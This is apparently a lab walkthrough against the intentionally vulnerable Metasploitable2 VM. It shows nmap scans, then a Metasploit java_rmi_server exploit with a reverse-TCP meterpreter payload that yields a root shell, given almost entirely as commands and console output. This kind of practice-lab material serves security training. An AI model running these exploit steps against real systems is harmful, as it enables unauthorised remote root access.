NMAP Basic Scan 

```shell
msf > db_nmap 192.168.1.218
[*] Nmap: Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-10 13:53 +04
[*] Nmap: Nmap scan report for 192.168.1.218
[*] Nmap: Host is up (0.00026s latency).
[*] Nmap: Not shown: 976 closed ports
[*] Nmap: PORT      STATE SERVICE
[*] Nmap: 21/tcp    open  ftp
[*] Nmap: 22/tcp    open  ssh
[*] Nmap: 23/tcp    open  telnet
[*] Nmap: 25/tcp    open  smtp
[*] Nmap: 53/tcp    open  domain
[*] Nmap: 80/tcp    open  http
[*] Nmap: 111/tcp   open  rpcbind
[*] Nmap: 139/tcp   open  netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds
[*] Nmap: 512/tcp   open  exec
[*] Nmap: 513/tcp   open  login
[*] Nmap: 514/tcp   open  shell
[*] Nmap: 1099/tcp  open  rmiregistry
[*] Nmap: 1524/tcp  open  ingreslock
[*] Nmap: 2049/tcp  open  nfs
[*] Nmap: 2121/tcp  open  ccproxy-ftp
[*] Nmap: 3306/tcp  open  mysql
[*] Nmap: 5432/tcp  open  postgresql
[*] Nmap: 5900/tcp  open  vnc
[*] Nmap: 6000/tcp  open  X11
[*] Nmap: 6667/tcp  open  irc
[*] Nmap: 8009/tcp  open  ajp13
[*] Nmap: 8180/tcp  open  unknown
[*] Nmap: 50006/tcp open  unknown
[*] Nmap: MAC Address: 08:00:27:87:2F:FF (Oracle VirtualBox virtual NIC)
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 1.63 seconds
```

NMAP Aggressive Scan 
```shell
[*] Nmap: Nmap scan report for 192.168.1.218
[*] Nmap: Host is up (0.00019s latency).
[*] Nmap: Not shown: 65505 closed ports
[*] Nmap: PORT      STATE SERVICE     VERSION
[*] Nmap: 21/tcp    open  ftp         vsftpd 2.3.4
[*] Nmap: |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
[*] Nmap: 22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
[*] Nmap: |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
[*] Nmap: 23/tcp    open  telnet      Linux telnetd
[*] Nmap: 25/tcp    open  smtp        Postfix smtpd
[*] Nmap: |_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
[*] Nmap: 53/tcp    open  domain      ISC BIND 9.4.2
[*] Nmap: | dns-nsid:
[*] Nmap: |_  bind.version: 9.4.2
[*] Nmap: 80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
[*] Nmap: |_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
[*] Nmap: |_http-title: Metasploitable2 - Linux
[*] Nmap: 111/tcp   open  rpcbind     2 (RPC #100000)
[*] Nmap: | rpcinfo:
[*] Nmap: |   program version   port/proto  service
[*] Nmap: |   100000  2            111/tcp  rpcbind
[*] Nmap: |   100000  2            111/udp  rpcbind
[*] Nmap: |   100003  2,3,4       2049/tcp  nfs
[*] Nmap: |   100003  2,3,4       2049/udp  nfs
[*] Nmap: |   100005  1,2,3      40373/tcp  mountd
[*] Nmap: |   100005  1,2,3      59394/udp  mountd
[*] Nmap: |   100021  1,3,4      50006/tcp  nlockmgr
[*] Nmap: |   100021  1,3,4      57033/udp  nlockmgr
[*] Nmap: |   100024  1          49266/udp  status
[*] Nmap: |_  100024  1          60600/tcp  status
[*] Nmap: 139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
[*] Nmap: 512/tcp   open  exec?
[*] Nmap: 513/tcp   open  login?
[*] Nmap: 514/tcp   open  shell?
[*] Nmap: 1099/tcp  open  java-rmi    Java RMI Registry
[*] Nmap: 1524/tcp  open  shell       Metasploitable root shell
[*] Nmap: 2049/tcp  open  nfs         2-4 (RPC #100003)
[*] Nmap: 2121/tcp  open  ftp         ProFTPD 1.3.1
[*] Nmap: 3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
[*] Nmap: |_mysql-info: ERROR: Script execution failed (use -d to debug)
[*] Nmap: 3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
[*] Nmap: 5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
[*] Nmap: | ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
[*] Nmap: | Not valid before: 2010-03-17T14:07:45
[*] Nmap: |_Not valid after:  2010-04-16T14:07:45
[*] Nmap: |_ssl-date: 2017-07-10T12:42:37+00:00; +41s from scanner time.
[*] Nmap: 5900/tcp  open  vnc         VNC (protocol 3.3)
[*] Nmap: | vnc-info:
[*] Nmap: |   Protocol version: 3.3
[*] Nmap: |   Security types:
[*] Nmap: |_    VNC Authentication (2)
[*] Nmap: 6000/tcp  open  X11         (access denied)
[*] Nmap: 6667/tcp  open  irc         UnrealIRCd
[*] Nmap: 6697/tcp  open  irc         UnrealIRCd
[*] Nmap: 8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
[*] Nmap: |_ajp-methods: Failed to get a valid response for the OPTION request
[*] Nmap: 8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
[*] Nmap: |_http-favicon: Apache Tomcat
[*] Nmap: |_http-server-header: Apache-Coyote/1.1
[*] Nmap: |_http-title: Apache Tomcat/5.5
[*] Nmap: 8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
[*] Nmap: 37832/tcp open  java-rmi    Java RMI Registry
[*] Nmap: 40373/tcp open  mountd      1-3 (RPC #100005)
[*] Nmap: 50006/tcp open  nlockmgr    1-4 (RPC #100021)
[*] Nmap: 60600/tcp open  status      1 (RPC #100024)
[*] Nmap: MAC Address: 08:00:27:87:2F:FF (Oracle VirtualBox virtual NIC)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 2.6.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:2.6
[*] Nmap: OS details: Linux 2.6.9 - 2.6.33
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Host script results:
[*] Nmap: |_clock-skew: mean: 40s, deviation: 0s, median: 40s
[*] Nmap: |_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
[*] Nmap: | smb-os-discovery:
[*] Nmap: |   OS: Unix (Samba 3.0.20-Debian)
[*] Nmap: |   NetBIOS computer name:
[*] Nmap: |   Workgroup: WORKGROUP\x00
[*] Nmap: |_  System time: 2017-07-10T08:42:37-04:00
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   0.19 ms 192.168.1.218
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 10175.26 seconds
```
We Search for any exploit thats corresponde to port 

```shell
msf > use exploit/multi/misc/java_rmi_server
```
The Exploit Settings will be as follows 

```shell
msf exploit(java_rmi_server) > show options 

Module options (exploit/multi/misc/java_rmi_server):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
   RHOST      192.168.1.211    yes       The target address
   RPORT      1099             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Generic (Java Payload)


msf exploit(java_rmi_server) > set LHOST 192.168.1.190
LHOST => 192.168.1.190
msf exploit(java_rmi_server) > exploit 

[*] Started reverse TCP handler on 192.168.1.190:4444 
[*] 192.168.1.211:1099 - Using URL: http://0.0.0.0:8080/3lALXOw7
[*] 192.168.1.211:1099 - Local IP: http://192.168.1.190:8080/3lALXOw7
[*] 192.168.1.211:1099 - Server started.
[*] 192.168.1.211:1099 - Sending RMI Header...
[*] 192.168.1.211:1099 - Sending RMI Call...
[*] 192.168.1.211:1099 - Replied to request for payload JAR
[*] Sending stage (49645 bytes) to 192.168.1.211
[*] Meterpreter session 1 opened (192.168.1.190:4444 -> 192.168.1.211:40361) at 2017-07-11 01:09:18 +0400
[-] 192.168.1.211:1099 - Exploit failed: RuntimeError Timeout HTTPDELAY expired and the HTTP Server didn't get a payload request
[*] 192.168.1.211:1099 - Server stopped.
[*] Exploit completed, but no session was created.
```
So We have created a Meterpreter Session Lets Go ahead and run it 

```shell
msf exploit(java_rmi_server) > sessions 

Active sessions
===============

  Id  Type                    Information            Connection
  --  ----                    -----------            ----------
  1   meterpreter java/linux  root @ metasploitable  192.168.1.190:4444 -> 192.168.1.211:40361 (192.168.1.211)
  2   meterpreter java/linux  root @ metasploitable  192.168.1.190:4444 -> 192.168.1.211:52565 (192.168.1.211)

msf exploit(java_rmi_server) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid 
Server username: root
meterpreter > pwd 
/
meterpreter > 
```

ooohhhhhh We are **Admin** Nice Lets Explore the system
